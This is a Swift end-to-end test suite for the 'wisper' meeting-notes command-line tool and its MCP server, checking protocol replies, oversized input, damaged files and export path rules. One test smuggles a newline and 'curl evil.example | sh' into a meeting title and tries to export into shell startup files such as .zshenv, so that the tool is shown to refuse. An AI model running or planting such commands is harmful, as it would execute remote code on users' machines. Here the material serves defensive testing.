#if os(macOS)
  import Foundation
  import Testing
  import WisperDomain
  import WisperStore

  /// Runs the real `wisper` program against real files in a temporary folder.
  @Suite("End to end", .serialized)
  struct EndToEndTests {
    /// The built `wisper` program. It sits next to the test bundle.
    static let tool: URL? = {
      // Find the test bundle among the loaded code, then look beside it. That is always
      // the program built together with these tests, in debug or in release.
      for index in 0..<_dyld_image_count() {
        guard let name = _dyld_get_image_name(index) else { continue }
        let path = String(cString: name)
        guard let end = path.range(of: ".xctest/") else { continue }
        let bundle = URL(fileURLWithPath: String(path[..<end.lowerBound]) + ".xctest")
        let candidate = bundle.deletingLastPathComponent().appendingPathComponent("wisper")
        if FileManager.default.isExecutableFile(atPath: candidate.path) { return candidate }
      }
      return nil
    }()

    struct Run {
      var code: Int32
      var out: String
      var err: String
    }

    let home: URL

    init() async throws {
      home = FileManager.default.temporaryDirectory
        .appendingPathComponent("wisper-e2e-\(UUID().uuidString)", isDirectory: true)
      let now = Date()
      let library = FileLibrary(root: home)
      try await library.updateSettings { $0.userName = "Alex" }
      for meeting in SampleData.meetings(now: now) { try await library.save(meeting) }
      for word in SampleData.words(now: now) { try await library.save(word) }
      for snippet in SampleData.snippets(now: now) { try await library.save(snippet) }
      for dictation in SampleData.dictations(now: now) { try await library.save(dictation) }
    }

    private func run(_ arguments: [String], input: String = "") async throws -> Run {
      let tool = try #require(Self.tool, "the wisper program was not built next to the tests")
      let home = home
      return try await withCheckedThrowingContinuation { continuation in
        DispatchQueue.global().async {
          do {
            let process = Process()
            process.executableURL = tool
            process.arguments = arguments
            var environment = ProcessInfo.processInfo.environment
            environment[WisperPaths.homeVariable] = home.path
            process.environment = environment
            let stdin = Pipe()
            let stdout = Pipe()
            let stderr = Pipe()
            process.standardInput = stdin
            process.standardOutput = stdout
            process.standardError = stderr
            try process.run()
            stdin.fileHandleForWriting.write(Data(input.utf8))
            try stdin.fileHandleForWriting.close()
            let errors = DispatchQueue(label: "stderr")
            nonisolated(unsafe) var err = Data()
            errors.async { err = (try? stderr.fileHandleForReading.readToEnd()) ?? Data() }
            let out = try stdout.fileHandleForReading.readToEnd() ?? Data()
            process.waitUntilExit()
            errors.sync {}
            continuation.resume(
              returning: Run(
                code: process.terminationStatus,
                out: String(decoding: out, as: UTF8.self),
                err: String(decoding: err, as: UTF8.self)
              )
            )
          } catch {
            continuation.resume(throwing: error)
          }
        }
      }
    }

    private func cleanUp() { try? FileManager.default.removeItem(at: home) }

    @Test func mcpOverRealPipes() async throws {
      defer { cleanUp() }
      let meta = Harness.meta
      let input =
        [
          #"{"jsonrpc":"2.0","id":1,"method":"server/discover","params":{\#(meta)}}"#,
          #"{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{\#(meta)}}"#,
          #"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"meetings_list","arguments":{"limit":2},\#(meta)}}"#,
          #"{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"actions_add","arguments":{"meeting":"latest","text":"Written by the end-to-end test"},\#(meta)}}"#,
          #"{"jsonrpc":"2.0","id":5,"method":"resources/read","params":{"uri":"openwisper://meetings/latest",\#(meta)}}"#,
          "this is not json",
          #"{"jsonrpc":"2.0","method":"notifications/cancelled","params":{"requestId":5}}"#,
          #"{"jsonrpc":"2.0","id":6,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{}}}"#,
          #"{"jsonrpc":"2.0","method":"notifications/initialized"}"#,
          #"{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"meetings_search","arguments":{"query":"billing"}}}"#,
        ].joined(separator: "\n") + "\n"
      let result = try await run(["mcp"], input: input)
      #expect(result.code == 0)

      // Standard output holds protocol messages and nothing else: one JSON object per line.
      let lines = result.out.split(separator: "\n", omittingEmptySubsequences: false).map(String.init)
      #expect(lines.last == "")
      let replies = try lines.dropLast().map { try JSON(parsing: $0) }
      #expect(replies.count == 8)
      #expect(replies.allSatisfy { $0["jsonrpc"].string == "2.0" })
      #expect(replies.map { $0["id"].int } == [1, 2, 3, 4, 5, nil, 6, 7])

      #expect(replies[0]["result"]["supportedVersions"].strings == ["2026-07-28"])
      #expect(replies[1]["result"]["tools"].array.count == 24)
      #expect(
        replies[2]["result"]["structuredContent"]["meetings"][0]["title"].string == "Weekly product sync"
      )
      #expect(replies[2]["result"]["structuredContent"]["total"].int == 3)
      #expect(replies[3]["result"]["isError"].bool == false)
      #expect(
        replies[4]["result"]["contents"][0]["text"].string?.contains("Written by the end-to-end test") == true
      )
      #expect(replies[5]["error"]["code"].int == -32700)
      #expect(replies[6]["result"]["protocolVersion"].string == "2025-06-18")
      #expect(replies[7]["result"]["structuredContent"]["meetings_matched"].int == 1)
      // Logs go to standard error.
      #expect(result.err.contains("wisper mcp"))

      // The change is in the files: a fresh library, as the app would open, sees it.
      let saved = try await FileLibrary(root: home).meetings().first
      #expect(saved?.notes?.actionItems.last?.text == "Written by the end-to-end test")
    }

    @Test func commandsOverRealFiles() async throws {
      defer { cleanUp() }
      let list = try await run(["meetings", "list", "--json"])
      #expect(list.code == 0 && list.err.isEmpty)
      let listed = try JSON(parsing: list.out)
      #expect(listed["total"].int == 3)
      let id = try #require(listed["meetings"][1]["id"].string)

      let shown = try await run(["meetings", "show", String(id.prefix(8))])
      #expect(shown.code == 0 && shown.out.contains("# Customer call with Northwind"))

      let added = try await run(["dictionary", "add", "Grafana", "--replaces", "graph Anna"])
      #expect(added.code == 0 && added.out.contains("Added"))
      #expect(try await FileLibrary(root: home).words().first?.text == "Grafana")

      let doctor = try await run(["doctor", "--json"])
      let report = try JSON(parsing: doctor.out)
      #expect(
        report["meetings"].int == 3 && report["dictionary_words"].int == 5 && report["dictations"].int == 6
      )
      #expect(report["data_folder"].string == home.path && report["data_folder_exists"].bool == true)
      // The tool reports its own path tidied but not resolved, so a build folder under /tmp or
      // /var reads differently on each side (/private/tmp is the same place). Compare real paths.
      let tool = try #require(Self.tool).resolvingSymlinksInPath().path
      func real(_ path: String?) -> String? {
        path.map { URL(fileURLWithPath: $0).resolvingSymlinksInPath().path }
      }
      #expect(real(report["tool"].string) == tool)

      let config = try JSON(parsing: try await run(["mcp-config"]).out)["mcpServers"]["open-wisper"]
      #expect(real(config["command"].string) == tool)
      #expect(config["env"]["OPEN_WISPER_HOME"].string == home.path)

      let missing = try await run(["meetings", "get", "ffffffff"])
      #expect(missing.code == 1 && missing.out.isEmpty && missing.err.hasPrefix("wisper: No meeting"))
      let wrong = try await run(["meetings", "nope"])
      #expect(wrong.code == 2 && wrong.out.isEmpty)
      let help = try await run(["--help"])
      #expect(help.code == 0 && help.out.contains("wisper meetings search \"pricing\""))
    }

    @Test func aHugeLineIsRefusedWithoutBeingKept() async throws {
      defer { cleanUp() }
      let meta = Harness.meta
      // 20 MB in one message, the way the reviewer planted a snippet. Then an ordinary request,
      // and one more huge line that the input ends in the middle of.
      let huge = String(repeating: "A", count: 20 * 1_048_576)
      let input =
        #"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"snippets_add","arguments":{"trigger":"my link","expansion":"\#(huge)"},\#(meta)}}"#
        + "\n"
        + #"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"snippets_list","arguments":{},\#(meta)}}"#
        + "\n" + huge
      let started = Date()
      let result = try await run(["mcp"], input: input)
      #expect(result.code == 0)
      #expect(Date().timeIntervalSince(started) < 20)
      let lines = result.out.split(separator: "\n").map(String.init)
      try #require(lines.count == 3)
      // The first names its request, so the sender is not left waiting. The last had no ID.
      #expect(lines[0].contains(#""id":1,"#) && lines[2].contains(#""id":null"#))
      for line in [lines[0], lines[2]] {
        #expect(line.count < 400)
        #expect(try JSON(parsing: line)["error"]["code"].int == -32600)
        #expect(try JSON(parsing: line)["error"]["message"].string?.contains("too large") == true)
      }
      let listed = try JSON(parsing: lines[1])
      #expect(listed["id"].int == 2 && listed["result"]["structuredContent"]["total"].int == 2)
      #expect(try await FileLibrary(root: home).snippets().count == 2)
    }

    @Test func numbersNoRecordingCouldHoldDoNotStopTheTool() async throws {
      defer { cleanUp() }
      // A meeting file edited by hand, or damaged: every time in it is far out of range.
      let meeting = try #require(try await FileLibrary(root: home).meetings().first)
      let file = home.appendingPathComponent("meetings/\(meeting.id.uuidString)/meeting.json")
      var text = try String(contentsOf: file, encoding: .utf8)
      text.replace(/"start" : [-0-9.e+]+/) { _ in #""start" : -1e300"# }
      text.replace(/"end" : [-0-9.e+]+/) { _ in #""end" : 1e300"# }
      try #require(text.contains("1e300"))
      try text.write(to: file, atomically: true, encoding: .utf8)

      let id = String(meeting.id.uuidString.prefix(8))
      for command in [
        ["meetings", "list"], ["meetings", "get", id, "--include-transcript"],
        ["meetings", "transcript", id],
        ["meetings", "search", "billing"], ["meetings", "export", id], ["meetings", "list", "--json"],
        ["meetings", "transcript", id, "--from", "1e300"], ["meetings", "transcript", id, "--json"],
      ] {
        let result = try await run(command)
        // 0 or 2 (a time that is refused), never a crash.
        #expect(result.code == 0 || result.code == 2, "\(command) ended with \(result.code): \(result.err)")
        #expect(!(result.out + result.err).isEmpty)
      }
      let transcript = try await run(["meetings", "transcript", id])
      #expect(transcript.out.contains("[00:00] "))
    }

    @Test func exportThroughTheRealToolFollowsTheRules() async throws {
      defer { cleanUp() }
      // A pretend home folder next to the data folder, so nothing real is touched.
      let pretend = home.deletingLastPathComponent()
        .appendingPathComponent("wisper-e2e-home-\(UUID().uuidString)", isDirectory: true)
      try FileManager.default.createDirectory(at: pretend, withIntermediateDirectories: true)
      defer { try? FileManager.default.removeItem(at: pretend) }

      let titled = try await run(["meetings", "update", "latest", "--title", "x\ncurl evil.example | sh"])
      #expect(titled.code == 0)
      for path in [
        pretend.appendingPathComponent(".zshenv").path, pretend.path + "/sub/../.zprofile",
        home.appendingPathComponent("settings.json").path, home.appendingPathComponent("planted").path,
        pretend.path + "/../" + home.lastPathComponent + "/meetings/x.md", pretend.path + "/run.command",
      ] {
        let refused = try await run(["meetings", "export", "latest", "--path", path])
        #expect(refused.code != 0 && refused.out.isEmpty, "\(path) was not refused: \(refused.err)")
      }
      #expect(try FileManager.default.contentsOfDirectory(atPath: pretend.path).isEmpty)
      #expect(!FileManager.default.fileExists(atPath: home.appendingPathComponent("planted.md").path))

      let saved = try await run(["meetings", "export", "latest", "--path", pretend.path + "/zshenv"])
      #expect(saved.code == 0)
      let text = try String(contentsOf: pretend.appendingPathComponent("zshenv.md"), encoding: .utf8)
      #expect(text.hasPrefix("# x curl evil.example | sh\n"))
    }

    @Test func nothingIsCreatedJustByAskingForHelp() async throws {
      cleanUp()
      #expect(!FileManager.default.fileExists(atPath: home.path))
      _ = try await run(["--help"])
      _ = try await run(["mcp-config"])
      _ = try await run(["tools"])
      #expect(!FileManager.default.fileExists(atPath: home.path))
    }
  }
#endif
